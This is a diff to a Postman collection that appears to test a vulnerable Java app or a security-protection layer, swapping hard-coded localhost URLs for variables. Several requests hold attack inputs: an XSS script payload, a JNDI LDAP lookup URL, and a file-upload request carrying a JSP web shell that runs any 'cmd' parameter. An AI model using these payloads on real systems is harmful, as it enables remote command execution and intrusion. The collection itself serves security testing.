+								"url": "http://{{base_url}}/SSRF/post/httpConnection.do"
 							},
 							"response": []
 						}
@@ -2407,12 +2407,12 @@
 								"method": "GET",
 								"header": [],
 								"url": {
-									"raw": "http://localhost:8000/SSRF/get/okHttp3.do?url=https://www.baidu.com",
+									"raw": "http://{{base_url}}/SSRF/get/okHttp3.do?url=https://www.baidu.com",
 									"protocol": "http",
 									"host": [
-										"localhost"
+										"{{base_host}}"
 									],
-									"port": "8000",
+									"port": "{{base_port}}",
 									"path": [
 										"SSRF",
 										"get",
@@ -2443,7 +2443,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/SSRF/post/okHttp3.do"
+								"url": "http://{{base_url}}/SSRF/post/okHttp3.do"
 							},
 							"response": []
 						},
@@ -2458,7 +2458,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/SSRF/cookie/okHttp3.do"
+								"url": "http://{{base_url}}/SSRF/cookie/okHttp3.do"
 							},
 							"response": []
 						},
@@ -2473,7 +2473,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/SSRF/header/okHttp3.do"
+								"url": "http://{{base_url}}/SSRF/header/okHttp3.do"
 							},
 							"response": []
 						},
@@ -2491,7 +2491,7 @@
 										}
 									}
 								},
-								"url": "http://localhost:8000/SSRF/json/okHttp3.do"
+								"url": "http://{{base_url}}/SSRF/json/okHttp3.do"
 							},
 							"response": []
 						},
@@ -2510,7 +2510,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/SSRF/post/okHttp3.do"
+								"url": "http://{{base_url}}/SSRF/post/okHttp3.do"
 							},
 							"response": []
 						}
@@ -2525,12 +2525,12 @@
 								"method": "GET",
 								"header": [],
 								"url": {
-									"raw": "http://localhost:8000/SSRF/get/httpClient.do?url=https://www.baidu.com",
+									"raw": "http://{{base_url}}/SSRF/get/httpClient.do?url=https://www.baidu.com",
 									"protocol": "http",
 									"host": [
-										"localhost"
+										"{{base_host}}"
 									],
-									"port": "8000",
+									"port": "{{base_port}}",
 									"path": [
 										"SSRF",
 										"get",
@@ -2561,7 +2561,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/SSRF/post/httpClient.do"
+								"url": "http://{{base_url}}/SSRF/post/httpClient.do"
 							},
 							"response": []
 						},
@@ -2576,7 +2576,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/SSRF/cookie/httpClient.do"
+								"url": "http://{{base_url}}/SSRF/cookie/httpClient.do"
 							},
 							"response": []
 						},
@@ -2591,7 +2591,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/SSRF/header/httpClient.do"
+								"url": "http://{{base_url}}/SSRF/header/httpClient.do"
 							},
 							"response": []
 						},
@@ -2609,7 +2609,7 @@
 										}
 									}
 								},
-								"url": "http://localhost:8000/SSRF/json/httpClient.do"
+								"url": "http://{{base_url}}/SSRF/json/httpClient.do"
 							},
 							"response": []
 						},
@@ -2628,7 +2628,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/SSRF/post/httpClient.do"
+								"url": "http://{{base_url}}/SSRF/post/httpClient.do"
 							},
 							"response": []
 						}
@@ -2654,7 +2654,7 @@
 								}
 							]
 						},
-						"url": "http://localhost:8000/FastJson/fastJsonParseObject.do"
+						"url": "http://{{base_url}}/FastJson/fastJsonParseObject.do"
 					},
 					"response": []
 				}
@@ -2678,7 +2678,7 @@
 								}
 							]
 						},
-						"url": "http://localhost:8000/Jackson/readValue.do"
+						"url": "http://{{base_url}}/Jackson/readValue.do"
 					},
 					"response": []
 				}
@@ -2701,7 +2701,7 @@
 								}
 							}
 						},
-						"url": "http://localhost:8000/XStream/xStream.do"
+						"url": "http://{{base_url}}/XStream/xStream.do"
 					},
 					"response": []
 				}
@@ -2724,7 +2724,7 @@
 								}
 							}
 						},
-						"url": "http://localhost:8000/Patch/readFileTest.do"
+						"url": "http://{{base_url}}/Patch/readFileTest.do"
 					},
 					"response": []
 				}
@@ -2738,7 +2738,7 @@
 					"request": {
 						"method": "GET",
 						"header": [],
-						"url": "http://10.10.99.2:8000/Blacklist/blacklist.do"
+						"url": "http://10.10.99.2:{{base_port}}/Blacklist/blacklist.do"
 					},
 					"response": []
 				}
@@ -2752,7 +2752,7 @@
 					"request": {
 						"method": "GET",
 						"header": [],
-						"url": "http://10.10.99.2:8000/Blacklist/url.do"
+						"url": "http://10.10.99.2:{{base_port}}/Blacklist/url.do"
 					},
 					"response": []
 				}
@@ -2767,7 +2767,7 @@
 						"method": "GET",
 						"header": [],
 						"url": {
-							"raw": "http://10.10.99.2:8000/Whitelist/url.do?xss=%3Cscript%3Ealert(%2Fxss%2F)%3B%3C%2Fscript%3E",
+							"raw": "http://10.10.99.2:{{base_port}}/Whitelist/url.do?xss=%3Cscript%3Ealert(%2Fxss%2F)%3B%3C%2Fscript%3E",
 							"protocol": "http",
 							"host": [
 								"10",
@@ -2775,7 +2775,7 @@
 								"99",
 								"2"
 							],
-							"port": "8000",
+							"port": "{{base_port}}",
 							"path": [
 								"Whitelist",
 								"url.do"
@@ -2808,12 +2808,12 @@
 								"method": "GET",
 								"header": [],
 								"url": {
-									"raw": "http://localhost:8000/JNDI/get/lookup.do?url=ldap://127.0.0.1:8888/test",
+									"raw": "http://{{base_url}}/JNDI/get/lookup.do?url=ldap://127.0.0.1:8888/test",
 									"protocol": "http",
 									"host": [
-										"localhost"
+										"{{base_host}}"
 									],
-									"port": "8000",
+									"port": "{{base_port}}",
 									"path": [
 										"JNDI",
 										"get",
@@ -2844,7 +2844,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/JNDI/post/lookup.do"
+								"url": "http://{{base_url}}/JNDI/post/lookup.do"
 							},
 							"response": []
 						},
@@ -2859,7 +2859,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/JNDI/cookie/lookup.do"
+								"url": "http://{{base_url}}/JNDI/cookie/lookup.do"
 							},
 							"response": []
 						},
@@ -2874,7 +2874,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/JNDI/header/lookup.do"
+								"url": "http://{{base_url}}/JNDI/header/lookup.do"
 							},
 							"response": []
 						},
@@ -2892,7 +2892,7 @@
 										}
 									}
 								},
-								"url": "http://localhost:8000/JNDI/json/lookup.do"
+								"url": "http://{{base_url}}/JNDI/json/lookup.do"
 							},
 							"response": []
 						},
@@ -2911,7 +2911,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/JNDI/post/lookup.do"
+								"url": "http://{{base_url}}/JNDI/post/lookup.do"
 							},
 							"response": []
 						}
@@ -2939,7 +2939,7 @@
 								}
 							}
 						},
-						"url": "http://localhost:8000/DisableMethod/log4j.do"
+						"url": "http://{{base_url}}/DisableMethod/log4j.do"
 					},
 					"response": []
 				}
@@ -2962,7 +2962,7 @@
 								}
 							}
 						},
-						"url": "http://localhost:8000/Yaml/yaml.do"
+						"url": "http://{{base_url}}/Yaml/yaml.do"
 					},
 					"response": []
 				}
@@ -2986,7 +2986,7 @@
 								}
 							]
 						},
-						"url": "http://localhost:8000/ScriptEngine/scriptEngineEval.do"
+						"url": "http://{{base_url}}/ScriptEngine/scriptEngineEval.do"
 					},
 					"response": []
 				}
@@ -3002,14 +3002,14 @@
 						"header": [],
 						"body": {
 							"mode": "raw",
-							"raw": "{\"req\":\"POST /FileUpload/upload.do HTTP/1.1\\nHost: 10.10.99.2:8000\\nContent-Length: 539\\nCache-Control: max-age=0\\nUpgrade-Insecure-Requests: 1\\nOrigin: null\\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryWqGd83IIbg2U327I\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\\nConnection: close\\n\\n------WebKitFormBoundaryWqGd83IIbg2U327I\\nContent-Disposition: form-data; name=\\\"username\\\"\\n\\nadmin\\n------WebKitFormBoundaryWqGd83IIbg2U327I\\nContent-Disposition: form-data; name=\\\"file\\\"; filename=\\\"=?UTF-8?Q?=E6=B5=8B=E8=AF=95=2Ejsp?=\\\"\\nContent-Type: application/octet-stream\\n\\n<%=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(request.getParameter(\\\"cmd\\\")).getInputStream())%>\\n------WebKitFormBoundaryWqGd83IIbg2U327I\\nContent-Disposition: form-data; name=\\\"submit\\\"\\n\\nSubmit\\n------WebKitFormBoundaryWqGd83IIbg2U327I--\\n\"}",
+							"raw": "{\"req\":\"POST /FileUpload/upload.do HTTP/1.1\\nHost: 10.10.99.2:{{base_port}}\\nContent-Length: 539\\nCache-Control: max-age=0\\nUpgrade-Insecure-Requests: 1\\nOrigin: null\\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryWqGd83IIbg2U327I\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\\nConnection: close\\n\\n------WebKitFormBoundaryWqGd83IIbg2U327I\\nContent-Disposition: form-data; name=\\\"username\\\"\\n\\nadmin\\n------WebKitFormBoundaryWqGd83IIbg2U327I\\nContent-Disposition: form-data; name=\\\"file\\\"; filename=\\\"=?UTF-8?Q?=E6=B5=8B=E8=AF=95=2Ejsp?=\\\"\\nContent-Type: application/octet-stream\\n\\n<%=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(request.getParameter(\\\"cmd\\\")).getInputStream())%>\\n------WebKitFormBoundaryWqGd83IIbg2U327I\\nContent-Disposition: form-data; name=\\\"submit\\\"\\n\\nSubmit\\n------WebKitFormBoundaryWqGd83IIbg2U327I--\\n\"}",
 							"options": {
 								"raw": {
 									"language": "json"
 								}
 							}
 						},
-						"url": "http://localhost:8000/Request/proxy.do"
+						"url": "http://{{base_url}}/Request/proxy.do"
 					},
 					"response": []
 				}
